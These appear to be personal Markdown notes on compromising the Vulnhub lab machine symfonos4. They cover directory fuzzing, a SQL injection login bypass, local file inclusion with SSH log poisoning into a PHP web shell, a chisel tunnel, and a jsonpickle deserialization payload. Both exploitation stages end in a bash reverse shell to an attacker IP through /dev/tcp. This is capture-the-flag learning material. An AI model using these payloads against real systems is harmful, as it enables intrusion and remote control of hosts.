
> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the brackets `[.php]`before executing them.

> [!NOTE]
> ```
> gods found nothing in so far
> 
> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <http://192.168.1.136/> -x logs,bak,php,html,zip,gz,asp,aspx
> 
> sea.[php]
> 
> admin'  or 1=1 or ''='
> 
> this got past the login form
> 
> found file= so immediately though of LFI
> 
> Fuzzing through auth request with cookies to find our LFI location 
> ffuf -c -u '<http://192.168.1.136/sea.[php]?file=../../../../../../FUZZ'> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -b 'PHPSESSID=russhgsf2b2asdt3rm4jr4o50l' -fl 21
> 
> We attempt to send some traffic to see if it get logged on the host
> 
> Sure enough it does!
> 
> can I run commands from here?
> 
> We certainly are. I did log poisning like this:
> ssh ssh '<?[php] [system]($_REQUEST['cmd']); ?>'@192.168.1.136
> 
> and got shell through this:
> <http://192[.]168[.]1[.]136/sea.[php]?file=../../../../../var/log/auth&cmd=bash%20-c%20%27exec%20bash%20-i%20&%3E/dev/tcp/192.168.1.42/443%20%3C&1%27>
> needed to fickle a bit with urlencoding but got in!
> 
> ===
> PRIVESC
> 
> [/usr/sbin/mysqld](file L3Vzci9zYmluL215c3FsZA==)
> [/usr/bin/gettext.sh](file L3Vzci9iaW4vZ2V0dGV4dC5zaA==)
> 
> /etc/init.d/mysql
> try root root mysql
> 
> /home/poseidon
> 
> HMMM ; D
> 
> So we transfer over a 32 bit chisel to target.
> 
> target:
> ./chisel32 client 192.168.1.42:8081 R:8000:127.0.0.1:8080
> 
> attacker:
> chisel server -p 8081 --reverse
> 
> 
> We're connected!
> 
> So this opens up a port through chisel at 8081 for our connection, and it takes their localhost at 8080 and we use their service but on our host, and on port 8000. Like so:
> 
> Definitely not my site hehe
> 
> 
> hm okay.. probably some cookie tampering we need to do
> 
> base64?
> 
> indeed it is
> can we change the user by base64 encoding it to someone else again then? 
> 
> Indeed I can!
> 
> but how does this help us.. hmm.. maybe it can execute commands through some means 
> 
> this does not work hmm.. lemme keep trying. nothing else seems interesting so far
> 
> these are python jsonpickle strings
> 
> “jsonpickle is a library for the two-way conversion of complex Python objects and JSON”
> “jsonpickle is a Python library for serialization and deserialization of complex Python objects to and from JSON.”
> 
> poseidon:
> {"py/object": "app.User", "username": "Poseidon"}
> eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==
> 
> So any of the cookie paramaters except the username seems fine. username value however breaks the application if the structure is insufficient. How interesting 
> 
> Our payload:
> 
> {"py/object":"__main__[.]Shell","py/reduce":[{"py/function":"os.system"},["bash -c 'exec bash -i &>/dev/tcp/192.168.1.42/443 <&1'"], 0, 0, 0]}
> 
> BOOOOMM
> 
> proof.txt!
> ```

![unnamed_c59aca134e3a4878860ec057b4939a48](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011506.png)
![unnamed_08d29cbd60ab4008ad326b57f50a2614](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011506-1.png)
![unnamed_a874e24bccf34f25b8e14a734bedefd5](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011506-2.png)
![unnamed_66e01a549deb43168745644dff952c4d](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507.png)
![unnamed_0b9db82eb40d4374ac9efec1dc229b6a](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-1.png)
![unnamed_0aff6679c26b49c88147bfcc4bad1d2f](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-2.png)
![unnamed_54337ae71dc64e0db0d1764082bc82b3](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-3.png)
![unnamed_1a5397ef5d3346feaa4c78ba413b7b30](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-4.png)
![unnamed_4220c80b26f546d7bddd3384b61dcc28](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-5.png)
![unnamed_d474a793670a4254b1ed73138ecfe161](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-6.png)
![unnamed_5fd0900c6e5246f6a5da8e73ed00a5b0](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-7.png)
![unnamed_ef23d0c56a1c4b78973a5d3adca4a59e](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-8.png)
![unnamed_dc460f0dbf6e442cafb1e04dedf76147](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-9.png)
![unnamed_52ec2215ca6843eea7672b91a1dc0132](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-10.png)
![unnamed_7ff37dc88f184366aedcde9b65275790](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-11.png)
![unnamed_f17ac4c652c3438783dcbe1f16f7d1e0](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-12.png)
![unnamed_3359723953a1475cb46055e1d0a0bc56](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-13.png)
![unnamed_ab97317085fd4addb2c3b774baeb9f07](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-14.png)
![unnamed_d0cdddc978384d9b91716b84d2f822f9](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-15.png)
![unnamed_fa812b39ab7247088bfb3281e4828f41](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-16.png)
![unnamed_deb9c34076e848cf82a8b1eac3a20650](docs/Attachments/Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos4/notes/{{notename}}-202605011507-17.png)